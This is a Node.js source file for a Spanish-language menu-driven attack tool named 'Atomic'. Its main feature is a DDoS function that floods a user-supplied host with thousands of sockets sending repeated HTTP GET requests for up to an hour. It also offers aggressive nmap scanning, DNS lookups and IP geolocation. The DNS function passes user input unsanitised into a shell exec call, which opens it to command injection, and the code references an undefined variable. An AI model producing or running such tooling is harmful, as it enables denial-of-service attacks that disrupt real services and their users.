const net = require('net');
const rl = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});
const axios = require('axios');
const lolcatjs = require('lolcatjs');
const figlet = require("figlet");
const { exec, spawn } = require('child_process');
const cluster = require('cluster');
const os = require('os');

lolcatjs.options = { 
    seed: Math.floor(Math.random() * 1000),
    colors: true,
    animate: true
};

const CPU_CORES = os.cpus().length;
let numConnections = 1000;
let attackDuration = 120;
let isAttacking = false;

const showBanner = () => {
    console.clear();
    figlet.text('Atomic', { font: 'ANSI Shadow' }, (err, data) => {
        if (!err) lolcatjs.fromString(data);
        lolcatjs.fromString('「Desarrollado por Keiji821」\n');
    });
};

const ddosAttack = async (target, connections, duration) => {
    if (isAttacking) {
        console.log('Ya hay un ataque en curso!');
        return;
    }
    
    isAttacking = true;
    showBanner();
    console.log(`\n\x1b[31m🔥 Iniciando ataque DDoS a ${target}\x1b[0m`);
    console.log(`\x1b[33m► Conexiones: ${connections}  ► Duración: ${duration}s  ► Nucleos: ${CPU_CORES}\x1b[0m\n`);
    
    const attackWorker = (url) => {
        const sockets = [];
        const createSocket = () => {
            const socket = new net.Socket();
            socket.connect(80, url, () => {
                setInterval(() => {
                    socket.write('GET / HTTP/1.1\r\nHost: ' + url + '\r\n\r\n');
                }, 100);
            });
            socket.on('error', () => socket.destroy());
            sockets.push(socket);
        };
        
        for (let i = 0; i < Math.ceil(connections / CPU_CORES); i++) {
            createSocket();
        }
        
        return sockets;
    };

    const workers = [];
    for (let i = 0; i < CPU_CORES; i++) {
        workers.push(attackWorker(target));
    }

    setTimeout(() => {
        workers.flat().forEach(socket => socket.destroy());
        isAttacking = false;
        console.log('\n\x1b[32m✔ Ataque finalizado\x1b[0m');
        setTimeout(showMenu, 2000);
    }, duration * 1000);
};

const updateCode = () => {
    exec('git reset --hard && git pull --no-rebase', (error, stdout) => {
        if (error) {
            lolcatjs.fromString(`Error: ${error.message}`);
        } else {
            lolcatjs.fromString('✅ Código actualizado!');
            lolcatjs.fromString(stdout);
        }
        setTimeout(showMenu, 1500);
    });
};

const getDNSInfo = (domain) => {
    exec(`dig +nocmd ${domain} ANY +multiline +tcp`, (error, stdout) => {
        if (error) {
            console.error(`\x1b[31m✖ Error: ${error.message}\x1b[0m`);
            return showMenu();
        }
        
        const result = [];
        const records = stdout.split('\n').filter(line => 
            line.trim() && !line.startsWith(';') && !line.includes(';;')
        );
        
        records.forEach(record => {
            const parts = record.split(/\s+/);
            if (parts.length > 4) {
                const [domain, ttl, cls, type, ...data] = parts;
                result.push(`\x1b[36m${type.padEnd(6)}\x1b[0m ${data.join(' ')} \x1b[90m(TTL: ${tts}s)\x1b[0m`);
            }
        });
        
        lolcatjs.fromString(figlet.textSync('DNS INFO'));
        console.log(`\nDominio: \x1b[35m${domain}\x1b[0m`);
        console.log(result.join('\n'));
        setTimeout(showMenu, 3000);
    });
};

const portScan = (target) => {
    showBanner();
    console.log(`\n\x1b[36m⌛ Escaneando ${target}...\x1b[0m\n`);
    
    const nmap = spawn('nmap', ['-T5', '-A', '-v', '-Pn', '-n', target]);
    let output = '';
    
    nmap.stdout.on('data', (data) => {
        output += data.toString();
        process.stdout.write(`\x1b[32m>\x1b[0m ${data.toString().split('\n')[0]}\n`);
    });
    
    nmap.stderr.on('data', (data) => {
        process.stdout.write(`\x1b[31m!\x1b[0m ${data.toString()}`);
    });
    
    nmap.on('close', () => {
        const openPorts = output.match(/\d+\/tcp\s+open\s+.+/g) || [];
        const osInfo = output.match(/OS: .+/);
        const serviceInfo = output.match(/Service Info: .+/);
        
        lolcatjs.fromString('\n═════ RESULTADOS ═════');
        console.log(`\x1b[33m${target}\x1b[0m - Puertos abiertos: ${openPorts.length}`);
        openPorts.forEach(port => console.log(` \x1b[36m➤\x1b[0m ${port}`));
        if (osInfo) console.log(`\n\x1b[35mOS:\x1b[0m ${osInfo[0]}`);
        if (serviceInfo) console.log(`\x1b[35mService:\x1b[0m ${serviceInfo[0]}`);
        setTimeout(showMenu, 2500);
    });
};

const getGeoIP = async (ip) => {
    try {
        const { data } = await axios.get(`http://ip-api.com/json/${ip}?fields=66846719`);
        
        figlet.text('GEO IP', (err, banner) => {
            if (!err) lolcatjs.fromString(banner);
            
            const info = [
                `\x1b[36mIP:\x1b[0m ${data.query} (${data.reverse})`,
                `\x1b[36mUbicación:\x1b[0m ${data.city}, ${data.regionName}, ${data.country} (${data.zip})`,
                `\x1b[36mCoordenadas:\x1b[0m ${data.lat}, ${data.lon} \x1b[90m(Maps: https://www.google.com/maps?q=${data.lat},${data.lon})\x1b[0m`,
                `\x1b[36mISP:\x1b[0m ${data.isp} (${data.org})`,
                `\x1b[36mAS:\x1b[0m ${data.as} (${data.asname})`,
                `\x1b[36mZona Horaria:\x1b[0m ${data.timezone}`,
                `\x1b[36mProxy:\x1b[0m ${data.proxy ? '\x1b[31mSí\x1b[0m' : '\x1b[32mNo\x1b[0m'} | \x1b[36mHosting:\x1b[0m ${data.hosting ? '\x1b[31mSí\x1b[0m' : '\x1b[32mNo\x1b[0m'}`
            ];
            
            console.log('\n' + info.join('\n'));
            setTimeout(showMenu, 3000);
        });
    } catch (error) {
        console.error(`\x1b[31m✖ Error: ${error.message}\x1b[0m`);
        setTimeout(showMenu, 1500);
    }
};

const showMenu = () => {
    showBanner();
    
    const menuItems = [
        '〔1〕Iniciar ataque DDoS',
        '〔2〕Actualizar código',
        `〔3〕Conexiones (${numConnections})`,
        `〔4〕Duración (${attackDuration}s)`,
        '〔5〕Información DNS',
        '〔6〕Escaneo de puertos',
        '〔7〕Geolocalización IP',
        '\n〔0〕Salir\n'
    ];
    
    menuItems.forEach(item => lolcatjs.fromString(item));
    rl.setPrompt('｢🎐｣➤ ');
    rl.prompt();
};

rl.on('line', (input) => {
    const option = input.trim();
    
    switch(option) {
        case '1':
            if (isAttacking) {
                console.log('\x1b[31m✖ Ya hay un ataque en curso!\x1b[0m');
                return showMenu();
            }
            rl.question('\n\x1b[36mURL/IP: \x1b[0m', target => {
                if (!target) {
                    console.log('\x1b[31m✖ Objetivo inválido!\x1b[0m');
                    return setTimeout(showMenu, 1000);
                }
                ddosAttack(target, numConnections, attackDuration);
            });
            break;
            
        case '2':
            updateCode();
            break;
            
        case '3':
            rl.question(`\nNuevo número de conexiones [${numConnections}]: `, num => {
                const newConn = parseInt(num) || numConnections;
                numConnections = Math.min(newConn, 100000);
                console.log(`\x1b[32m✔ Conexiones establecidas: ${numConnections}\x1b[0m`);
                setTimeout(showMenu, 1000);
            });
            break;
            
        case '4':
            rl.question(`\nDuración del ataque [${attackDuration}s]: `, time => {
                const newTime = parseInt(time) || attackDuration;
                attackDuration = Math.min(newTime, 3600);
                console.log(`\x1b[32m✔ Duración establecida: ${attackDuration}s\x1b[0m`);
                setTimeout(showMenu, 1000);
            });
            break;
            
        case '5':
            rl.question('\nDominio/IP: ', domain => {
                if (!domain) {
                    console.log('\x1b[31m✖ Entrada inválida!\x1b[0m');
                    return setTimeout(showMenu, 1000);
                }
                getDNSInfo(domain);
            });
            break;
            
        case '6':
            rl.question('\nIP/Dominio: ', target => {
                if (!target) {
                    console.log('\x1b[31m✖ Objetivo inválido!\x1b[0m');
                    return setTimeout(showMenu, 1000);
                }
                portScan(target);
            });
            break;
            
        case '7':
            rl.question('\nIP/Dominio: ', ip => {
                if (!ip) {
                    console.log('\x1b[31m✖ IP inválida!\x1b[0m');
                    return setTimeout(showMenu, 1000);
                }
                getGeoIP(ip);
            });
            break;
            
        case '0':
            console.log('\n\x1b[36mSaliendo...\x1b[0m');
            process.exit();
            
        default:
            console.log('\x1b[31m✖ Opción inválida!\x1b[0m');
            setTimeout(showMenu, 800);
    }
});

// Inicio
showBanner();
setTimeout(showMenu, 500);